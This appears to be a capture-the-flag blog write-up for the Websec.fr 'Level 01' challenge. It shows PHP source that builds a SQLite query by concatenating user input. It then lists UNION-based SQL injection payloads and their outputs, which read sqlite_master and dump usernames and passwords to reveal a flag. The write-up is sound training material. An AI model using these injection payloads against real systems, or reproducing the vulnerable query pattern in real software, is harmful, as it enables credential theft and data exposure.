---
private: 'false'
layout: post
featured: false
published: true
comments: true
modified: 2018-03-22
date: 2018-03-22
title: 'Websec.fr Easy: Level 01 - 1pts'
tags: [hackthebox]
mathjax: false
imagefeature: 
description: 'Websec.fr Easy: Level 01'
category: Websec.fr
chart: null
---


## Problem
---

Problem URL : https://websec.fr/level01/index.php<br />
Problem Description : Nothing fancy

```php
<?php
session_start ();

ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

include 'anti_csrf.php';

init_token ();

class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
        
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    check_and_refresh_token();

    $lo = new LevelOne ();
    $userDetails = $lo->doQuery ($_POST['user_id']);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>#WebSec Level One</title>
    <link rel="stylesheet" href="../static/bootstrap.min.css" />
</head>
    <body>
        <div id="main">
            <div class="container">
                <div class="row">
                    <h1>LevelOne <small> - Select the user by ID you wish to view</small></h1>
                </div>
                <div class="row">
                    <p class="lead">
                        <a href="source.php">This application</a> is used to view the username by the given user ID,
                        it will return the corresponding username from the database.<br>
                    </p>
                </div>
            </div>
            <div class="container">
                <?php if (isset ($userDetails) && !empty ($userDetails)): ?>
                    <div class="row">
                        <p class="well"><strong>Username for given ID</strong>: <?php echo $userDetails['username']; ?> </p>
                        <p class="well"><strong>Other User Details</strong>: <br />
                            <?php 
                            $keys = array_keys ($userDetails);
                            $i = 0;

                            foreach ($userDetails as $user) { 
                                echo $keys[$i++] . ' -> ' . $user . "<br />";
                            } 
                            ?> 
                        </p>
                    </div>
                <?php endif; ?>

                <div class="row">
                    <label for="user_id">Enter the user ID:</label>
                    <form name="username" method="post">
                        <div class="form-group col-md-2">
                            <input type="text" class="form-control" id="user_id" name="user_id" value="1" required>
                        </div>
                        <div class="col-md-2">
                            <input type="submit" class="form-control btn btn-default" placeholder="Submit!" name="submit">
                        </div>
                        <input type="hidden" id="token" name="token" value="<?php echo $_SESSION['token']; ?>">
                    </form>
                </div>
            </div>
        </div>
        <script type="text/javascript" src="../static/bootstrap.min.js"></script>
    </body>
</html>

```


## Solve
---

The problem is using SQLite and the query is vulnerable to Injection because they 
use our input without sanitize anything.


```

input => 2 UNION SELECT 1,1/*
output => Other User Details: 
          id -> 1
          username -> 1
 
input => 2 UNION SELECT 1,sql from sqlite_master/*
output => Other User Details: 
          id -> 1
          username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255))
          
input => 2222 UNION SELECT username,password from users/*
output => Other User Details: 
          id -> ExampleUser
          username -> ExampleUserPassword
          
input => 2222 UNION SELECT username,password from users limit 2,1/*
output => Other User Details: 
          id -> levelone
          username -> WEBSEC{S[READCATED]injection}
```

**Note:**  Within SQLite we could get what table and column information using default sqlite_master tables
just like information_schema in mysql ╰(▔∀▔)╯
